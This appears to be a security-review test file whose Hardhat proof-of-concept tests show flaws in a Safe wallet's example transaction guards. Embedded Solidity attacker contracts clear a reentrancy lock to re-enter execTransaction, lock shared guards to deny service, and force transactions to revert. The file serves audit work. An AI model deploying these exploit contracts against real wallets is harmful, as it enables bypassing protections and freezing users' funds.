import { expect } from "chai";
import hre from "hardhat";
import { AddressZero } from "@ethersproject/constants";
import { deployContractFromSource, getMock, getSafe } from "../../../test/utils/setup";
import {
    buildSafeTransaction,
    buildSignatureBytes,
    executeContractCallWithSigners,
    executeTxWithSigners,
    safeSignTypedData,
} from "../../../src/utils/execution";

// Security review PoC for contracts/examples/guards (run with:
//   AUDIT_LOCAL_SOLC=1 npx hardhat test docs/security-review/poc/guards-reentrancy-debug.spec.ts --network hardhat)

const ATTACKER_SRC = `
pragma solidity ^0.7.0;
pragma abicoder v2;
interface IGuardLike { function checkAfterExecution(bytes32 hash, bool success) external; }
contract GuardUnlockAttacker {
    uint256 public innerCalls;
    // Called as the \`to\` of a Safe transaction. Optionally clears the guard flag, then re-enters the Safe.
    function attack(address guard, bool unlock, address safe, bytes calldata execCall) external {
        if (unlock) IGuardLike(guard).checkAfterExecution(bytes32(0), false);
        (bool ok, bytes memory ret) = safe.call(execCall);
        if (!ok) { assembly { revert(add(ret, 0x20), mload(ret)) } }
        innerCalls++;
    }
}`;

const GRIEFER_SRC = `
pragma solidity ^0.7.0;
pragma abicoder v2;
interface IGuardLike { function checkAfterExecution(bytes32 hash, bool success) external; }
interface ISafeHash {
    function nonce() external view returns (uint256);
    function getTransactionHash(address to, uint256 value, bytes calldata data, uint8 operation, uint256 safeTxGas,
        uint256 baseGas, uint256 gasPrice, address gasToken, address refundReceiver, uint256 _nonce) external view returns (bytes32);
}
contract DebugGuardGriefer {
    // Called as the \`to\` of a Safe transaction (operation CALL, zero gas params). Recomputes the Safe tx hash of the
    // in-flight transaction and clears the guard's bookkeeping for it so the Safe's own post-check reverts.
    function grief(address guard) external payable {
        ISafeHash safe = ISafeHash(msg.sender);
        bytes32 h = safe.getTransactionHash(address(this), msg.value, msg.data, 0, 0, 0, 0, address(0), address(0), safe.nonce() - 1);
        IGuardLike(guard).checkAfterExecution(h, false);
    }
}`;

const SETUP_LIB_SRC = `
pragma solidity ^0.7.0;
interface IModuleEnabler { function enableModule(address module) external; }
contract SetupEnableModule {
    // delegatecalled from Safe.setup: address(this) is the Safe, so this self-call passes \`authorized\`.
    function enable(address module) external { IModuleEnabler(address(this)).enableModule(module); }
}`;

const MODULE_SRC = `
pragma solidity ^0.7.0;
pragma abicoder v2;
interface ISafeModuleExec { function execTransactionFromModule(address to, uint256 value, bytes calldata data, uint8 operation) external returns (bool); }
contract SimpleModule {
    function exec(address safe, address to, bytes calldata data) external returns (bool ok) {
        ok = ISafeModuleExec(safe).execTransactionFromModule(to, 0, data, 0);
        require(ok, "module exec failed");
    }
}`;

const GUARD_STORAGE_SLOT = "0x4a204f620c8c5ccdca3fd54d003badd85ba500436a431f0cbda4f558c93c34c8";

describe("Security review PoC: example guards [@skip-on-coverage]", () => {
    const setupTests = hre.deployments.createFixture(async ({ deployments }) => {
        await deployments.fixture();
        const signers = await hre.ethers.getSigners();
        const [user1] = signers;
        const safe = await getSafe({ owners: [user1.address] });
        const reentrancyGuard = await (await hre.ethers.getContractFactory("ReentrancyTransactionGuard")).deploy();
        const debugGuard = await (await hre.ethers.getContractFactory("DebugTransactionGuard")).deploy();
        const mock = await getMock();
        const attacker = await deployContractFromSource(user1, ATTACKER_SRC);
        const griefer = await deployContractFromSource(user1, GRIEFER_SRC);
        return { safe, reentrancyGuard, debugGuard, mock, attacker, griefer, signers };
    });

    describe("ReentrancyTransactionGuard", () => {
        it("a callee can clear the lock and re-enter execTransaction (guard bypass)", async () => {
            const {
                safe,
                reentrancyGuard,
                mock,
                attacker,
                signers: [user1],
            } = await setupTests();
            const safeAddress = await safe.getAddress();
            const guardAddress = await reentrancyGuard.getAddress();
            await executeContractCallWithSigners(safe, safe, "setGuard", [guardAddress], [user1]);

            const nonce = await safe.nonce();
            // T2: the "next" transaction, already signed by the owner (e.g. queued with a relayer).
            const t2 = buildSafeTransaction({ to: await mock.getAddress(), data: "0xbaddad42", nonce: nonce + 1n });
            const sig2 = buildSignatureBytes([await safeSignTypedData(user1, safeAddress, t2)]);
            const execCall = safe.interface.encodeFunctionData("execTransaction", [
                t2.to,
                t2.value,
                t2.data,
                t2.operation,
                t2.safeTxGas,
                t2.baseGas,
                t2.gasPrice,
                t2.gasToken,
                t2.refundReceiver,
                sig2,
            ]);
            const attackerAddress = await attacker.getAddress();

            // Control: without the unlock call the guard works as intended.
            const t1NoUnlock = buildSafeTransaction({
                to: attackerAddress,
                data: attacker.interface.encodeFunctionData("attack", [guardAddress, false, safeAddress, execCall]),
                nonce,
            });
            await expect(executeTxWithSigners(safe, t1NoUnlock, [user1])).to.be.revertedWith("Reentrancy detected");
            expect(await mock.invocationCount()).to.eq(0n);

            // Attack: callee calls guard.checkAfterExecution(0, false) (permissionless) then re-enters.
            const t1 = buildSafeTransaction({
                to: attackerAddress,
                data: attacker.interface.encodeFunctionData("attack", [guardAddress, true, safeAddress, execCall]),
                nonce,
            });
            await executeTxWithSigners(safe, t1, [user1]);
            expect(await mock.invocationCount()).to.eq(1n);
            expect(await attacker.innerCalls()).to.eq(1n);
            expect(await safe.nonce()).to.eq(nonce + 2n);
        });

        it("anyone can lock the guard (DoS for every Safe using it) and anyone can unlock it", async () => {
            const {
                safe,
                reentrancyGuard,
                mock,
                signers: [user1, user2],
            } = await setupTests();
            const guardAddress = await reentrancyGuard.getAddress();
            await executeContractCallWithSigners(safe, safe, "setGuard", [guardAddress], [user1]);

            // Random EOA sets the flag directly.
            await reentrancyGuard
                .connect(user2)
                .checkTransaction(AddressZero, 0, "0x", 0, 0, 0, 0, AddressZero, AddressZero, "0x", AddressZero);

            const tx = buildSafeTransaction({ to: await mock.getAddress(), data: "0xbaddad42", nonce: await safe.nonce() });
            await expect(executeTxWithSigners(safe, tx, [user1])).to.be.revertedWith("Reentrancy detected");

            // Random EOA clears it again.
            await reentrancyGuard.connect(user2).checkAfterExecution(hre.ethers.ZeroHash, false);
            await executeTxWithSigners(safe, tx, [user1]);
            expect(await mock.invocationCount()).to.eq(1n);
        });

        it("a shared guard deployment blocks legitimate nested Safe-calls-Safe execution", async () => {
            const {
                safe: safeA,
                reentrancyGuard,
                mock,
                signers: [user1],
            } = await setupTests();
            const safeB = await getSafe({ owners: [user1.address] });
            const safeBAddress = await safeB.getAddress();
            const guardAddress = await reentrancyGuard.getAddress();
            await executeContractCallWithSigners(safeA, safeA, "setGuard", [guardAddress], [user1]);
            await executeContractCallWithSigners(safeB, safeB, "setGuard", [guardAddress], [user1]);

            const tB = buildSafeTransaction({ to: await mock.getAddress(), data: "0xbaddad42", nonce: await safeB.nonce() });
            const sigB = buildSignatureBytes([await safeSignTypedData(user1, safeBAddress, tB)]);
            const execCallB = safeB.interface.encodeFunctionData("execTransaction", [
                tB.to,
                tB.value,
                tB.data,
                tB.operation,
                tB.safeTxGas,
                tB.baseGas,
                tB.gasPrice,
                tB.gasToken,
                tB.refundReceiver,
                sigB,
            ]);
            // Safe A executes a transaction whose target is Safe B's execTransaction (distinct Safes, no reentrancy).
            const tA = buildSafeTransaction({ to: safeBAddress, data: execCallB, nonce: await safeA.nonce() });
            await expect(executeTxWithSigners(safeA, tA, [user1])).to.be.revertedWith("Reentrancy detected");
        });
    });

    describe("DebugTransactionGuard", () => {
        it("a callee can force the whole Safe transaction to revert via permissionless checkAfterExecution", async () => {
            const {
                safe,
                debugGuard,
                griefer,
                signers: [user1],
            } = await setupTests();
            const guardAddress = await debugGuard.getAddress();
            await executeContractCallWithSigners(safe, safe, "setGuard", [guardAddress], [user1]);

            const tx = buildSafeTransaction({
                to: await griefer.getAddress(),
                data: griefer.interface.encodeFunctionData("grief", [guardAddress]),
                nonce: await safe.nonce(),
            });
            await expect(executeTxWithSigners(safe, tx, [user1])).to.be.revertedWith("Could not get nonce");
        });

        it("nonce 0 collides with the 'not set' sentinel when the guard is installed without consuming a nonce", async () => {
            const {
                debugGuard,
                mock,
                signers: [user1],
            } = await setupTests();
            const setupLib = await deployContractFromSource(user1, SETUP_LIB_SRC);
            const module = await deployContractFromSource(user1, MODULE_SRC);
            const moduleAddress = await module.getAddress();
            const guardAddress = await debugGuard.getAddress();

            // Module enabled during setup (no nonce consumed), then the module installs the guard (no nonce consumed).
            const safe = await getSafe({
                owners: [user1.address],
                to: await setupLib.getAddress(),
                data: setupLib.interface.encodeFunctionData("enable", [moduleAddress]),
            });
            const safeAddress = await safe.getAddress();
            expect(await safe.isModuleEnabled(moduleAddress)).to.eq(true);
            await module.exec(safeAddress, safeAddress, safe.interface.encodeFunctionData("setGuard", [guardAddress]));
            expect(hre.ethers.getAddress("0x" + (await hre.ethers.provider.getStorage(safeAddress, GUARD_STORAGE_SLOT)).slice(26))).to.eq(
                guardAddress,
            );
            expect(await safe.nonce()).to.eq(0n);

            const tx = buildSafeTransaction({ to: await mock.getAddress(), data: "0xbaddad42", nonce: 0n });
            await expect(executeTxWithSigners(safe, tx, [user1])).to.be.revertedWith("Could not get nonce");
        });
    });
});
